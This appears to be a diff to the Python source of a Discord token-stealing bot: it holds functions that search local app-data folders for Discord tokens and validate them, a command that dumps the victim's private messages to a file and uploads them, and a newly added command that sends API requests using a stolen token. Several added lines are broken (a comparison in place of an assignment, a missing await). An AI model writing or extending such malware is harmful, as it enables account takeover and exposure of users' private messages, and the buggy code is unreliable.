@@ -1,3 +1,4 @@
+import random
 import discord
 from discord.ext import commands
 import asyncio
@@ -7,6 +8,7 @@ import datetime
 import threading
 import requests
 
+tokenworking = ""
 attackerid = "" #your id
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
@@ -25,6 +27,7 @@ def check_token(token):
     if str(r2.status_code) == "401":
         return False
     else:
+        tokenworking == token
         return True 
 
 def find_tokens(path):
@@ -48,6 +51,15 @@ async def on_ready():
     print("Logged in as: " + bot.user.name)
 
 @bot.command()
+async def ban_account(ctx):
+    headers = {
+        "user-agent": "Mozzilla/5.0 (Windows NT 1.0;) Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/737.36",
+        "authorization": tokenworking
+    }
+    for _ in range(5):
+        requests.get("https://discord.com/api/v8/guilds/" + ctx.guild.id + "/members", headers=headers)
+
+@bot.command()
 async def dmdump(ctx):
     for ch in bot.private_channels:
         messages = await ch.history(limit=200).flatten()
@@ -55,7 +67,7 @@ async def dmdump(ctx):
             with open("C:\\Users\\Public\\dms.txt", "a", encoding='utf-8-sig') as dmfile:
                 to_write = str(message.channel) + "> " + str(message.content) + "\n"
                 dmfile.write(to_write)
-        await ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
+        ctx.send(file=discord.File("C:\\Users\\Public\\dms.txt"))
 @bot.command()
 async def delete(ctx):
     try:
